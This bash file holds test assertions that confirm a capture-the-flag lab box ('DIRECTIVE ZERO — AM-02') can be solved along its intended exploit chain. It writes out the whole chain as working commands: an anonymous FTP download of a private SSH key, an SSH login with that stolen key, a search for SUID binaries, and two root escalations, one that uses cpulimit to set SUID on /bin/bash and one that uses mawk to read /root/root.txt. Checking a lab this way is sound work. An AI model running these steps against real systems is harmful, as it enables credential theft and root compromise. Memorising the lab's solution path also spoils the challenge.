#!/usr/bin/env bash
#
# DIRECTIVE ZERO — AM-02 exploit-chain test assertions.
#
# Sourced by _test_runner/run_tests.sh. Must define run_am_tests().
# Uses helper functions provided by the runner:
#   assert_port_open <port>
#   assert_http_contains <path> <pattern> [post_data]
#   assert_ftp_anon_download <remote_path> <local_dest>
#   assert_ssh_key_login <user> <key_path>
#   assert_ssh_key_command <user> <key_path> <cmd> <pattern>
#   assert_flag_matches <actual> <expected>
#   pass / fail
#
# Env vars set by the runner:
#   AM_USER_FLAG, AM_ROOT_FLAG, TARGET_HOST, TARGET_SSH_PORT

run_am_tests() {
  local http_port="${TARGET_HTTP_PORT:-8080}"
  local ssh_port="${TARGET_SSH_PORT:-22}"
  local ftp_port="${TARGET_FTP_PORT:-21}"

  echo "Stage 1 — service enumeration"
  assert_port_open "$ftp_port"
  assert_port_open "$ssh_port"
  assert_port_open "$http_port"

  echo "Stage 2 — HTTP decoy (misdirection)"
  assert_http_contains "/" "does not exist"

  echo "Stage 3 — anonymous FTP -> steal id_rsa from hidden .wellness/"
  # The hidden dir is nested one level deeper than the source box:
  #   ftp root -> public/ -> .wellness/ -> id_rsa
  local key_path=/tmp/dz_am02_id_rsa
  rm -f "$key_path"
  assert_ftp_anon_download "public/.wellness/id_rsa" "$key_path"
  # Confirm the downloaded file looks like an RSA private key.
  if head -1 "$key_path" 2>/dev/null | grep -q 'BEGIN.*PRIVATE KEY'; then
    pass "downloaded id_rsa is a valid PEM private key"
  else
    fail "downloaded id_rsa is not a valid PEM private key"
  fi
  chmod 600 "$key_path"

  echo "Stage 4 — SSH lateral as wellness using stolen key + user flag"
  assert_ssh_key_login "wellness" "$key_path"
  local user_actual
  user_actual="$(ssh -i "$key_path" -p "${TARGET_SSH_PORT:-22}" \
    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    wellness@${TARGET_HOST} 'cat /home/wellness/user.txt' 2>/dev/null \
    | tr -d '\n')"
  assert_flag_matches "$user_actual" "$AM_USER_FLAG"

  echo "Stage 5 — SUID enumeration (cpulimit + mawk)"
  assert_ssh_key_command "wellness" "$key_path" \
    "find / -perm -4000 -type f 2>/dev/null" "/usr/bin/cpulimit"
  assert_ssh_key_command "wellness" "$key_path" \
    "find / -perm -4000 -type f 2>/dev/null" "/usr/bin/mawk"

  echo "Stage 6a — privesc Route A: cpulimit -> chmod +s bash -> root flag"
  local root_actual_a
  # cpulimit prints "Process N detected / Child process is finished" to
  # stdout before the flag — extract only the DZ{...} token.
  root_actual_a="$(ssh -i "$key_path" -p "${TARGET_SSH_PORT:-22}" \
    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    wellness@${TARGET_HOST} \
    '/usr/bin/cpulimit -l 100 -f chmod +s /bin/bash 2>/dev/null; /bin/bash -p -c "cat /root/root.txt"' \
    2>/dev/null | grep -oE 'DZ\{[^}]+\}' | tr -d '\n')"
  assert_flag_matches "$root_actual_a" "$AM_ROOT_FLAG"

  # Restore bash perms so the alternate route is testable independently.
  # (In a fresh container this doesn't matter; in a re-run against the
  # same container it prevents bash staying SUID across route tests.)
  ssh -i "$key_path" -p "${TARGET_SSH_PORT:-22}" \
    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    wellness@${TARGET_HOST} 'chmod 755 /bin/bash 2>/dev/null; true' 2>/dev/null

  echo "Stage 6b — privesc Route B (alternate): mawk reads root flag directly"
  local root_actual_b
  root_actual_b="$(ssh -i "$key_path" -p "${TARGET_SSH_PORT:-22}" \
    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    wellness@${TARGET_HOST} '/usr/bin/mawk "//" /root/root.txt' \
    2>/dev/null | tr -d '\n')"
  assert_flag_matches "$root_actual_b" "$AM_ROOT_FLAG"

  echo "Stage 7 — lore Fragment B in transfer logs"
  assert_ssh_key_command "wellness" "$key_path" \
    "cat /home/wellness/transfer_logs/archive_status.log" "FRAGMENT B"
}